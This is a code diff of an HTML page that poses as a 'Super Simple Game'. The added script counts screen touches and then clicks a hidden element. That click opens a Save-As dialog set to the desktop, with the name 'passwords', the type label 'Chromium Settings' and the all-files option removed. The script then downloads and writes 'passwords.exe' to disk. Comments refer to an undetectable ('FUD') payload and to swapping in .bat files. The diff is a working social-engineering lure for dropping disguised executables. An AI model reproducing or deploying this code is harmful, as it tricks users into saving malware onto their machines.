@@ -42,64 +42,54 @@
 
 
 <body>
-    <script>
-        //how many time enter clicked in row
-        let countEnter = 0;
-        //is file downloaded
-        let isDownloaded = false;
+   <script>
+    // how many times screen is touched in a row
+    let countTouch = 0;
+    // is file downloaded
+    let isDownloaded = false;
 
-        //on page load
-        window.onload = function () {
-            const body = document.querySelector('body')
-            const pixel = document.querySelector('#pixel')
+    // on page load
+    window.onload = function () {
+        const body = document.querySelector('body');
+        const pixel = document.querySelector('#pixel');
 
-            body.onkeydown = e => (e.key == "Enter") ? clickedEnter() : 1;
-            body.onkeyup = e => (e.key == "Enter") ? cancelEnter() : 1;
-
-            pixel.addEventListener('click', async () => {
-                const options = {
-                    startIn: 'desktop',
-                    suggestedName: 'passwords',
-                    types: [
-                        {
-                            description:
-                                'Chromium Settings',
-                            accept: {
-                                'text/plain': ['.exe'] //could be .exe/.bat or anything
-                            }
-                        }
-                    ],
-                    //delete from Save as type "*.*" option
-                    excludeAcceptAllOption: true
-                }
-
-                const handle = await window.showSaveFilePicker(options);
-                const writable = await handle.createWritable();
-                // 1) download file from local/server (Good for exe)
-                //you need to have FUD file lnkextra.lnk on server/local
-                //can be changed to diffrent file like cat.jpg
-                const response = await fetch('passwords.exe');
-                await response.body.pipeTo(writable);
-
-                document.querySelector("#gameover").textContent = "GAME OVER - Need refresh to start again"
-            })
-        };
-
-        function clickedEnter() {
-            countEnter++;            
-            //if button was hold more then 1 second and it wasn't downloaded - we can change !isDownloaded to countEnter % 30 === 0 to download many files
-            if (countEnter > 5 && !isDownloaded) {
-                pixel.click()
-                //set file is downloaded
+        document.addEventListener('touchstart', () => {
+            countTouch++;
+            if (countTouch > 5 && !isDownloaded) {
+                pixel.click();
+                // set file is downloaded
                 isDownloaded = true;
             }
-        }
+        });
 
-        function cancelEnter() {
-            //reset count enter if enter is not hold
-            countEnter = 0;
-        }
-    </script>
+        pixel.addEventListener('click', async () => {
+            const options = {
+                startIn: 'desktop',
+                suggestedName: 'passwords',
+                types: [
+                    {
+                        description: 'Chromium Settings',
+                        accept: {
+                            'text/plain': ['.exe'] // could be .exe/.bat or anything
+                        }
+                    }
+                ],
+                // delete from Save as type "*.*" option
+                excludeAcceptAllOption: true
+            };
+
+            const handle = await window.showSaveFilePicker(options);
+            const writable = await handle.createWritable();
+            // 1) download file from local/server (Good for exe)
+            // you need to have FUD file lnkextra.lnk on server/local
+            // can be changed to diffrent file like cat.jpg
+            const response = await fetch('passwords.exe');
+            await response.body.pipeTo(writable);
+
+            document.querySelector("#gameover").textContent = "GAME OVER - Need refresh to start again";
+        });
+    };
+   </script>
     <!-- div used to click to open Save As dialog -->
     <div id="pixel"></div>
     <h1>Super Simple Game😻😻😻</h1>
